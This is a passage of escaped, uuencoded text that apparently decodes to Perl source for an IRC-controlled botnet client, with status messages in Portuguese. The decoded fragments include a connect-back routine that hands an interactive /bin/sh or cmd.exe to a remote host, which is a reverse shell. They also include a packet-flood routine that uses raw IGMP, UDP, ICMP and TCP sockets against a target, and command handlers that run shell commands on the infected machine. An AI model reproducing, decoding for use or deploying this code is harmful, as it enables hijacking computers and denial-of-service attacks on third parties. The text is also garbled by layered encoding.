uot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1A;&#x27;9O(#T@:6YE=%]A=&amp;]N*&quot;(D_9F%I&gt;&amp;%I&lt;&quot;XD9F%I&gt;&amp;$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;!A8V]T93TD&lt;F%N9&quot;!X(&quot;1R86YD(&#x27;@@)&#x27;)A_;F0[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1P;W)T82`](&amp;EN=&quot;AR86YD(#8U,#`P*2`K,2!I9B`H)&#x27;!O&lt;G1A(#T]_(&quot;(P(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F0H5&#x27;(P&gt;&quot;P@,&quot;P@)&#x27;!A8V]T92P@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O_&lt;G1A+&quot;`D86QV;RDI(&amp;%N9&quot;`D&lt;&amp;%C;W1E&lt;V4K*R!I9B`H)&#x27;!A8V]T97,@/3T@(C$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;`@:68@*&quot;1F86EX82`^/2`R-34I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D9F%I&gt;&amp;$@/2`Q.PH@(&quot;`@_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&amp;EF(&quot;@D97-T871I&lt;W1I8V%S*0H@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&#x27;)A=R@D25)#_7V-U&lt;E]S;V-K970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)496UP;R!D92!086-O=&amp;5S7#`P,CH@)&#x27;1E;7!O_(BXB&lt;R(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT_;&quot;`Z7#`P,E1O=&amp;%L(&amp;1E(%!A8V]T97-&lt;,#`R.B`D&lt;&amp;%C;W1E&lt;V4B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&#x27;)A_=R@D25)#7V-U&lt;E]S;V-K970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)!;&#x27;9O(&amp;1O&lt;R!086-O=&amp;5S7#`P,CH@_)&amp;%L=F\\B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&amp;5L&lt;VEF(&quot;@D9G5N_8V%R9R`]?B`O7F-O;F)A8VM&lt;&lt;RLH+BHI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&amp;AO&lt;W0@/2`B_)#$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1P;W)T82`](&quot;(D,B([&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;!R;W1O(#T@_9V5T&lt;&#x27;)O=&amp;]B&gt;6YA;64H)W1C&lt;&quot;&lt;I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1I861D&lt;B`](&amp;EN971?871O;B@D:&amp;]S_=&quot;D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@;7D@)&#x27;!A9&amp;1R(#T@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O&lt;G1A+&quot;`D:6%D9&#x27;(I.PH@(&quot;`@_(&quot;`@(&quot;`@(&quot;`@(&amp;UY(&quot;1S:&amp;5L;&quot;`](&quot;(O8FEN+W-H(&quot;UI(CL*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)%Y/(&amp;5Q(&quot;)-_4U=I;C,R(BD@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&#x27;-H96QL(#T@(F-M9&quot;YE&gt;&amp;4B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S;V-K970H4T]#2T54+&quot;!01E])3D54+&quot;!33T-+7U-44D5!32P@)&#x27;!R;W1O*2!O&lt;B!D_:64@(G-O8VME=#H@)&quot;$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;-O;FYE8W0H4T]#2T54+&quot;`D&lt;&amp;%D9&#x27;(I(&amp;]R(&amp;1I92`B_8V]N;F5C=#H@)&quot;$B.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;]P96XH4U1$24XL(&quot;(^)E-/0TM%5&quot;(I.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&amp;]P96XH4U1$3U54+&quot;`B/B933T-+150B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!O&lt;&amp;5N*%-41$524BP@(CXF4T]#_2T54(BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;WES=&amp;5M*&quot;(D&lt;VAE;&amp;PB*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C;&amp;]S92A35$1)_3BD[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@8VQO&lt;V4H4U1$3U54*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C;&amp;]S92A35$1%4E(I.PH*_(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!I9B`H)&amp;5S=&amp;%T:7-T:6-A&lt;RD*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;![&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@_(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#I&lt;,#`R0V]N96-T86YD;RUS92!E_;5PP,#(Z(&quot;1H;W-T.B1P;W)T82(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;`@?0H*(&quot;`@(&quot;`@(&quot;`@_(&quot;!E;&#x27;-I9B`H)&amp;9U;F-A&lt;F&lt;@/7X@+UYO;&amp;1P86-K7&#x27;,K*&quot;XJ*5QS*RA&lt;9&quot;LI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;`@_(&quot;`@(&quot;`@(&#x27;)E=&#x27;5R;B!U;FQE&lt;W,@)&#x27;!A8V]T97,[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`H)&amp;1T:6UE+&quot;`E&lt;&amp;%C;W1E_&lt;RD@/2!A=&#x27;1A8VME&lt;B@B)#$B+&quot;`B)#(B+&quot;`B)#,B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1D=&amp;EM92`](#$@:68@)&amp;1T_:6UE(#T](#`[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!M&gt;2`E8GET97,[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D8GET97-[:6=M&lt;&#x27;T@/2`D_,B`J(&quot;1P86-O=&amp;5S&gt;VEG;7!].PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;)Y=&amp;5S&gt;VEC;7!](#T@)#(@*B`D&lt;&amp;%C;W1E&lt;WMI_8VUP?3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1B&gt;71E&lt;WMO?2`](&quot;0R(&quot;H@)&#x27;!A8V]T97-[;WT[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`D_8GET97-[=61P?2`](&quot;0R(&quot;H@)&#x27;!A8V]T97-[=61P?3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1B&gt;71E&lt;WMT8W!](#T@)#(@_*B`D&lt;&amp;%C;W1E&lt;WMT8W!].PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@=6YL97-S(&quot;@D97-T871I&lt;W1I8V%S*0H@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@&gt;PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z_7#`P,B`M(%-T871U&lt;R`M7#`P,B(I.PH@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@_(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z7#`P,E1I;7!&lt;,#`R.B`D9&#x27;1I;64B+B)S96-U;F1E+B(I.PH@(&quot;`@(&quot;`@(&quot;`@_(&quot;`@(&quot;!S96YD&lt;F%W*&quot;1)4D-?8W5R7W-O8VME=&quot;P@(E!2259-4T&lt;@)&#x27;!R:6YT;&quot;`Z7#`P,E1O=&amp;%L(&#x27;!A8VME_=%PP,#(Z(&quot;(N*&quot;1P86-O=&amp;5S&gt;W5D&lt;&#x27;T@*R`D&lt;&amp;%C;W1E&lt;WMI9VUP?2`K(&quot;1P86-O=&amp;5S&gt;VEC;7!](&quot;L@(&quot;1P_86-O=&amp;5S&gt;V]]*2D[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C:V5T+&quot;`B4%))5DU31R`D_&lt;&#x27;)I;G1L(#I&lt;,#`R5&amp;]T86P@8GET97-&lt;,#`R.B`B+B@D8GET97-[:6-M&lt;&#x27;T@*R`D8GET97,@&gt;VEG;7!](&quot;L@_)&amp;)Y=&amp;5S&gt;W5D&lt;&#x27;T@*R`D8GET97-[;WTI*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;V5N9&#x27;)A=R@D25)#7V-U&lt;E]S;V-K_970L(&quot;)04DE635-&#x27;(&quot;1P&lt;FEN=&amp;P@.EPP,#)&amp;;&amp;]O9%PP,#(Z(&quot;(N:6YT*&quot;@H)&amp;)Y=&amp;5S&gt;VEC;7!]*R1B&gt;71E_&lt;WMI9VUP?2LD8GET97-[=61P?2`K(&quot;1B&gt;71E&lt;WMO?2DO,3`R-&quot;DO)&amp;1T:6UE*2XB(&amp;MB&lt;&#x27;,B*3L*(&quot;`@(&quot;`@_(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;!]&quot;B`@(&quot;`@(&quot;`@(&quot;`@97AI=#L*(&quot;`@(&quot;`@(&#x27;T*(&quot;!]&quot;GT*&quot;G-U8B!I&lt;F-A_&lt;V4@&gt;PH@(&amp;UY(&quot;@D:V5M+&quot;`D&lt;&#x27;)I;G1L+&quot;`D8V%S92D@/2!`7SL*&quot;B`@(&amp;EF(&quot;@D8V%S92`]?B`O7FIO:6X@_*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;!J*&quot;(D,2(I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7G!A&lt;G0@*&quot;XJ*2\\I(&#x27;L*_(&quot;`@(&quot;`@&lt;&quot;@B)#$B*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYR96IO:6Y&lt;&lt;RLH+BHI+RD@&gt;PH@(&quot;`@_(&quot;!M&gt;2`D8VAA;B`](&quot;0Q.PH@(&quot;`@(&quot;!I9B`H)&amp;-H86X@/7X@+UXH7&amp;0K*2`H+BHI+RD@&gt;PH@(&quot;`@(&quot;`@(&amp;9O_&lt;B`H;7D@)&amp;-A(#T@,3L@)&amp;-A(#P](&quot;0Q.R`D8V$K*R`I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&#x27;`H(B0R(BD[&quot;B`@(&quot;`@(&quot;`@_(&quot;!J*&quot;(D,B(I.PH@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&#x27;`H(B1C:&amp;%N(BD[&quot;B`@(&quot;`@_(&quot;`@(&quot;!J*&quot;(D8VAA;B(I.PH@(&quot;`@(&quot;!]&quot;B`@(&#x27;T*(&quot;`@96QS:68@*&quot;1C87-E(#U^(&quot;]&gt;;W`O*2![&quot;B`@(&quot;`@_(&amp;]P*&quot;(D&lt;&#x27;)I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E&lt;2`B;W`B.PH@(&quot;`@(&quot;!M&gt;2`D;V%R9R`](&#x27;-U8G-T_&lt;B@D8V%S92P@,RD[&quot;B`@(&quot;`@(&amp;]P*&quot;(D,2(L(&quot;(D,B(I(&amp;EF(&quot;@D;V%R9R`]?B`O*%Q3*RE&lt;&lt;RLH7%,K*2\\I_.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7F1E;W`O*2![&quot;B`@(&quot;`@(&amp;1E;W`H(B1P&lt;FEN=&amp;PB+&quot;`B)&amp;ME_;2(I(&amp;EF(&quot;1C87-E(&amp;5Q(&quot;)D96]P(CL*(&quot;`@(&quot;`@;7D@)&amp;]A&lt;F&lt;@/2!S=6)S=&#x27;(H)&amp;-A&lt;V4L(#4I.PH@(&quot;`@_(&quot;!D96]P*&quot;(D,2(L(&quot;(D,B(I(&amp;EF(&quot;@D;V%R9R`]?B`O*%Q3*RE&lt;&lt;RLH7%,K*2\\I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF_(&quot;@D8V%S92`]?B`O7G9O:6-E+RD@&gt;PH@(&quot;`@(&quot;!V;VEC92@B)&#x27;!R:6YT;&quot;(L(&quot;(D:V5M(BD@:68@)&amp;-A&lt;V4@_97$@(G9O:6-E(CL*(&quot;`@(&quot;`@)&amp;]A&lt;F&lt;@/2!S=6)S=&#x27;(H)&amp;-A&lt;V4L(#8I.PH@(&quot;`@(&quot;!V;VEC92@B)#$B+&quot;`B_)#(B*2!I9B`H)&amp;]A&lt;F&lt;@/7X@+RA&lt;4RLI7&#x27;,K*%Q3*RDO*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYD_979O:6-E+RD@&gt;PH@(&quot;`@(&quot;!D979O:6-E*&quot;(D&lt;&#x27;)I;G1L(BP@(B1K96TB*2!I9B`D8V%S92!E&lt;2`B9&amp;5V;VEC_92([&quot;B`@(&quot;`@(&quot;1O87)G(#T@&lt;W5B&lt;W1R*&quot;1C87-E+&quot;`X*3L*(&quot;`@(&quot;`@9&amp;5V;VEC92@B)#$B+&quot;`B)#(B*2!I_9B`H)&amp;]A&lt;F&lt;@/7X@+RA&lt;4RLI7&#x27;,K*%Q3*RDO*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYM&lt;V=&lt;&lt;RLH_7%,K*2`H+BHI+RD@&gt;PH@(&quot;`@(&quot;!M&lt;V&lt;H(B0Q(BP@(B0R(BD[&quot;B`@(&#x27;T*(&quot;`@96QS:68@*&quot;1C87-E(#U^(&quot;]&gt;_9FQO;V1&lt;&lt;RLH7&amp;0K*5QS*RA&lt;4RLI(&quot;@N*BDO*2![&quot;B`@(&quot;`@(&amp;9O&lt;B`H;7D@)&amp;-F(#T@,3L@)&amp;-F(#P](&quot;0Q_.R`D8V8K*RD@&gt;PH@(&quot;`@(&quot;`@(&amp;US9R@B)#(B+&quot;`B)#,B*3L*(&quot;`@(&quot;`@?0H@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S_92`]?B`O7F-T8W!F;&amp;]O9%QS*RA&lt;9&quot;LI7&#x27;,K*%Q3*RD@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;`@9F]R(&quot;AM&gt;2`D8V8@/2`Q_.R`D8V8@/#T@)#$[(&quot;1C9BLK*2![&quot;B`@(&quot;`@(&quot;`@8W1C&lt;&quot;@B)#(B+&quot;`B)#,B*3L*(&quot;`@(&quot;`@?0H@(&quot;!]&quot;B`@_(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7F-T8W!&lt;&lt;RLH7%,K*2`H+BHI+RD@&gt;PH@(&quot;`@(&quot;!C=&amp;-P*&quot;(D,2(L(&quot;(D,B(I_.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7FEN=FET95QS*RA&lt;4RLI(&quot;@N*BDO*2![&quot;B`@(&quot;`@(&amp;EN=FET_92@B)#$B+&quot;`B)#(B*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYN:6-K(&quot;@N*BDO*2![&quot;B`@(&quot;`@(&amp;YI_8VLH(B0Q(BD[&quot;B`@(&#x27;T*(&quot;`@96QS:68@*&quot;1C87-E(#U^(&quot;]&gt;8V]N96-T85QS*RA&lt;4RLI7&#x27;,K*%Q3*RDO*2![_&quot;B`@(&quot;`@(&quot;!C;VYE8W1A&lt;B@B)#(B+&quot;`B)#$B+&quot;`V-C8W*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYS_96YD7&#x27;,K*%Q3*RE&lt;&lt;RLH7%,K*2\\I(&#x27;L*(&quot;`@(&quot;`@1$-#.CI314Y$*&quot;(D,2(L(&quot;(D,B(I.PH@(&quot;!]&quot;B`@(&amp;5L_&lt;VEF(&quot;@D8V%S92`]?B`O7G)A=R`H+BHI+RD@&gt;PH@(&quot;`@(&quot;!S96YD&lt;F%W*&quot;(D,2(I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF_(&quot;@D8V%S92`]?B`O7F5V86P@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;`@979A;&quot;`B)#$B.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S_92`]?B`O7F5N=&#x27;)A7&#x27;,K*%Q3*RE&lt;&lt;RLH7&amp;0K*2\\I(&#x27;L*(&quot;`@(&#x27;-L965P(&amp;EN=&quot;AR86YD*&quot;0R*2D[&quot;B`@(&quot;!J_*&quot;(D,2(I.PH@(&quot;!]&quot;B`@(&amp;5L&lt;VEF(&quot;@D8V%S92`]?B`O7G-A:5QS*RA&lt;4RLI7&#x27;,K*%QD*RDO*2![&quot;B`@(&quot;!S_;&amp;5E&lt;&quot;!I;G0H&lt;F%N9&quot;@D,BDI.PH@(&quot;`@&lt;&quot;@B)#$B*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYS86ER_+RD@&gt;PH@(&quot;`@(&#x27;%U:70H*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H)&amp;-A&lt;V4@/7X@+UYN;W9O;FEC:R\\I(&#x27;L*(&quot;`@(&amp;UY_(&quot;1N;W9O;FEC:R`](&amp;=E=&amp;YI8VLH*3L*(&quot;`@(&quot;!N:6-K*&quot;(D;F]V;VYI8VLB*3L*(&quot;`@?0H@(&quot;!E;&#x27;-I9B`H_)&amp;-A&lt;V4@/7X@+UYE&lt;W1A=&amp;ES=&amp;EC87,@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&quot;!I9B`H)#$@97$@(F]N(BD@&gt;PH@(&quot;`@(&quot;`D_97-T871I&lt;W1I8V%S(#T@,3L*(&quot;`@(&quot;`@;7-G*&quot;(D&lt;&#x27;)I;G1L(BP@(D5S=&amp;%T+G-T:6-A&lt;R!A=&amp;EV861A&lt;R$B_*3L*(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D,2!E&lt;2`B;V9F(BD@&gt;PH@(&quot;`@(&quot;`D97-T871I&lt;W1I8V%S(#T@,#L*(&quot;`@(&quot;`@_;7-G*&quot;(D&lt;&#x27;)I;G1L(BP@(D5S=&amp;%T+G-T:6-A&lt;R!D97-A=&amp;EV861A&lt;R$B*3L*(&quot;`@(&quot;!]&quot;B`@(&#x27;T*(&quot;`@96QS_:68@*&quot;1C87-E(#U^(&quot;]&gt;&lt;&amp;%C;W1E&lt;R`H+BHI+RD@&gt;PH@(&quot;`@(&amp;EF(&quot;@D,2!E&lt;2`B;VXB*2![&quot;B`@(&quot;`@(&quot;1P_86-O=&amp;5S(#T@,3L*(&quot;`@(&quot;`@;7-G*&quot;(D&lt;&#x27;)I;G1L(BP@(E!A8V]T97,@871I=F%D;W,A(BD@:68@*&quot;1E&lt;W1A_=&amp;ES=&amp;EC87,@/3T@(C$B*3L*(&quot;`@(&quot;!](&amp;5L&lt;VEF(&quot;@D,2!E&lt;2`B;V9F(BD@&gt;PH@(&quot;`@(&quot;`D&lt;&amp;%C;W1E&lt;R`]_(#`[&quot;B`@(&quot;`@(&amp;US9R@B)&#x27;!R:6YT;&quot;(L(&quot;)086-O=&amp;5S(&amp;1E&lt;V%T:79A9&amp;]S(2(I(&amp;EF(&quot;@D97-T871I&lt;W1I_8V%S(#T](&quot;(Q(BD[&quot;B`@(&quot;`@?0H@(&quot;!]&quot;GT*&lt;W5B(&#x27;-H96QL(&#x27;L*(&quot;!R971U&lt;FX@=6YL97-S(&quot;1A8V5S&lt;V]S_:&amp;5L;#L*(&quot;!M&gt;2`D&lt;&#x27;)I;G1L/21?6S!=.PH@(&amp;UY(&quot;1C;VUA;F1O/21?6S%=.PH@(&amp;EF(&quot;@D8V]M86YD;R`]_?B`O8V0@*&quot;XJ*2\\I(&#x27;L*(&quot;`@(&amp;-H9&amp;ER*&quot;(D,2(I(&#x27;Q\\(&amp;US9R@B)&#x27;!R:6YT;&quot;(L(&quot;)$:7)E=&quot;YR:6\\@:6YE_&gt;&amp;ES=&amp;5N=&amp;4A(BD[&quot;B`@(&quot;!R971U&lt;FX[&quot;B`@?0H@(&amp;5L&lt;VEF(&quot;@D&lt;&amp;ED(#T@9F]R:RD@&gt;PH@(&quot;`@(&#x27;=A:71P_:60H)&#x27;!I9&quot;P@,&quot;D[&quot;B`@?2!E;&#x27;-E(&#x27;L*(&quot;`@(&quot;`@:68@*&amp;9O&lt;FLI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@97AI=#L*(&quot;`@(&quot;`@_(&#x27;T@96QS92![&quot;B`@(&quot;`@(&quot;`@(&quot;`@;7D@0&#x27;)E&lt;W`]8&quot;1C;VUA;F1O(#(^)C$@,SXF,6`[&quot;B`@(&quot;`@(&quot;`@(&quot;`@_;7D@)&amp;,],#L*(&quot;`@(&quot;`@(&quot;`@(&quot;!F;W)E86-H(&amp;UY(&quot;1L:6YH82`H0&#x27;)E&lt;W`I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;1C_*RL[&quot;B`@(&quot;`@(&quot;`@(&quot;`@(&quot;!C:&amp;]P(&quot;1L:6YH83L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&#x27;-E;F1R87&lt;H)$E20U]C=7)?&lt;V]C_:V5T+&quot;`B4%))5DU31R`D&lt;&#x27;)I;G1L(#HD;&amp;EN:&amp;$B*3L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&amp;EF(&quot;@D8R`^/2`B)&amp;QI;F%S_7VUA&gt;&quot;(I(&#x27;L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@)&amp;,],#L*(&quot;`@(&quot;`@(&quot;`@(&quot;`@(&quot;`@&lt;VQE97`@)&#x27;-L965P.PH@(&quot;`@_(&quot;`@(&quot;`@(&quot;`@?0H@(&quot;`@(&quot;`@(&quot;`@(&#x27;T*(&quot;`@(&quot;`@(&quot;`@(&quot;!E&gt;&amp;ET.PH@(&quot;`@(&quot;`@?0H@(&#x27;T*?0H*&lt;W5B(&amp;%T_=&amp;%C:V5R(&#x27;L*(&quot;!M&gt;2`D:6%D9&#x27;(@/2!I;F5T7V%T;VXH)%];,%TI.PH@(&amp;UY(&quot;1M&lt;V&lt;@/2`G0B&lt;@&gt;&quot;`D7ULQ_73L*(&quot;!M&gt;2`D9G1I;64@/2`D7ULR73L*(&quot;!M&gt;2`D8W`@/2`P.PH@(&amp;UY(&quot;@E&lt;&amp;%C;W1E&lt;RD[&quot;B`@)&#x27;!A8V]T_97-[:6-M&lt;&#x27;T@/2`D&lt;&amp;%C;W1E&lt;WMI9VUP?2`](&quot;1P86-O=&amp;5S&gt;W5D&lt;&#x27;T@/2`D&lt;&amp;%C;W1E&lt;WMO?2`](&quot;1P86-O_=&amp;5S&gt;W1C&lt;&#x27;T@/2`P.PH*(&quot;!S;V-K970H4T]#2S$L(%!&amp;7TE.150L(%-/0TM?4D%7+&quot;`R*2!O&lt;B`D8W`K*SL*_(&quot;!S;V-K970H4T]#2S(L(%!&amp;7TE.150L(%-/0TM?1$=204TL(#$W*2!O&lt;B`D8W`K*SL*(&quot;!S;V-K970H4T]#_2S,L(%!&amp;7TE.150L(%-/0TM?4D%7+&quot;`Q*2!O&lt;B`D8W`K*SL*(&quot;!S;V-K970H4T]#2S0L(%!&amp;7TE.150L(%-/_0TM?4D%7+&quot;`V*2!O&lt;B`D8W`K*SL*(&quot;!R971U&lt;FXH=6YD968I(&amp;EF(&quot;1C&lt;&quot;`]/2`T.PH@(&amp;UY(&quot;1I=&amp;EM92`]_(&#x27;1I;64[&quot;B`@;7D@*&quot;1C=7)?=&amp;EM92D[&quot;B`@=VAI;&amp;4@*&quot;`Q(&quot;D@&gt;PH@(&quot;`@(&amp;9O&lt;B`H;7D@)&#x27;!O&lt;G1A(#T@_,3L@)&#x27;!O&lt;G1A(#P](#8U-3,U.R`D&lt;&amp;]R=&amp;$K*RD@&gt;PH@(&quot;`@(&quot;`@)&amp;-U&lt;E]T:6UE(#T@=&amp;EM92`M(&quot;1I=&amp;EM_93L*(&quot;`@(&quot;`@(&amp;QA&lt;W0@:68@)&amp;-U&lt;E]T:6UE(#X](&quot;1F=&amp;EM93L*(&quot;`@(&quot;`@(&#x27;-E;F0H4T]#2S$L(&quot;1M&lt;V&lt;L_(#`L(&#x27;-O8VMA9&amp;1R7VEN*&quot;1P;W)T82P@)&amp;EA9&amp;1R*2D@86YD(&quot;1P86-O=&amp;5S&gt;VEG;7!]*RL@:68@*&quot;1P86-O_=&amp;5S(#T](#$I.PH@(&quot;`@(&quot;`@&lt;V5N9&quot;A33T-+,BP@)&amp;US9RP@,&quot;P@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O&lt;G1A+&quot;`D:6%D_9&#x27;(I*2!A;F0@)&#x27;!A8V]T97-[=61P?2LK(&amp;EF(&quot;@D&lt;&amp;%C;W1E&lt;R`]/2`Q*3L*(&quot;`@(&quot;`@(&#x27;-E;F0H4T]#2S,L_(&quot;1M&lt;V&lt;L(#`L(&#x27;-O8VMA9&amp;1R7VEN*&quot;1P;W)T82P@)&amp;EA9&amp;1R*2D@86YD(&quot;1P86-O=&amp;5S&gt;VEC;7!]*RL@:68@_*&quot;1P86-O=&amp;5S(#T](#$I.PH@(&quot;`@(&quot;`@&lt;V5N9&quot;A33T-+-&quot;P@)&amp;US9RP@,&quot;P@&lt;V]C:V%D9&#x27;)?:6XH)&#x27;!O&lt;G1A_+&quot;`D:6%D9&#x27;(I*2!A;F0@)&#x27;!A8V]T97-[=&amp;-P?2LK(&amp;EF(&quot;@D&lt;&amp;%C;W1E&lt;R`]/2`Q*3L*&quot;B`@(&quot;`@(&quot;!F;W(@_*&amp;UY(&quot;1P8R`](#,[(&quot;1P8R`\\/2`R-34[)&#x27;!C*RLI(&#x27;L*(&quot;`@(&quot;`@(&quot;`@;F5X=&quot;!I9B`D&lt;&amp;,@/3T@-CL*(&quot;`@_(&quot;`@(&quot;`@)&amp;-U&lt;E]T:6UE(#T@=&amp;EM92`M(&quot;1I=&amp;EM93L*(&quot;`@(&quot;`@(&quot;`@;&amp;%S=&quot;!I9B`D8W5R7W1I;64@/CT@_)&amp;9T:6UE.PH@(&quot;`@(&quot;`@(&quot;!S;V-K970H4T]#2S4L(%!&amp;7TE.150L(%-/0TM?4D%7+&quot;`D&lt;&amp;,I(&amp;]R(&amp;YE&gt;&#x27;0[_&quot;B`@(&quot;`@(&quot;`@(&#x27;-E;F0H4T]#2S4L(&quot;1M&lt;V&lt;L(#`L(&#x27;-O8VMA9&amp;1R7VEN*&quot;1P;W)T82P@)&amp;EA9&amp;1R*2D@86YD_(&quot;1P86-O=&amp;5S&gt;V]]*RL@:68@*&quot;1P86-O=&amp;5S(#T](#$I.PH@(&quot;`@(&quot;`@?0H@(&quot;`@(&#x27;T*(&quot;`@(&quot;!L87-T(&amp;EF_(&quot;1C=7)?=&amp;EM92`^/2`D9G1I;64[&quot;B`@?0H@(&#x27;)E=&#x27;5R;B@D8W5R7W1I;64L(&quot;5P86-O=&amp;5S*3L*?0H*&quot;G-U_8B!A8W1I;VX@&gt;PH@(&quot;!R971U&lt;FX@=6YL97-S(&quot;0C7R`]/2`Q.PH@(&quot;!S96YD&lt;F%W*&quot;)04DE635-&#x27;(&quot;1?6S!=_(#I&lt;,#`Q04-424].(&quot;1?6S%=7#`P,2(I.PI]&quot;@IS=6(@8W1C&lt;&quot;![&quot;B`@(&#x27;)E=&#x27;5R;B!U;FQ